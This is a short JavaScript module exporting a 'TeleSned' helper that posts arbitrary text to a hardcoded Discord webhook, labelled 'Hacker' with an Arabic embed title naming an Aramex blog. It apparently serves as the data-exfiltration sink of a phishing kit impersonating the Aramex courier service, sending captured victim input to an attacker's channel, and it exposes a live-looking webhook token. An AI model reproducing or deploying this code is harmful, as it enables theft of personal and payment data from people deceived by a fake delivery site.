import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1365739159435739236/GenqkjhvDTUgP2L9g10lzLkgT9Oa09S-ZmtACJ8Cgh47vVZRAbiCp_9XIHWFtWdyVHZI",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
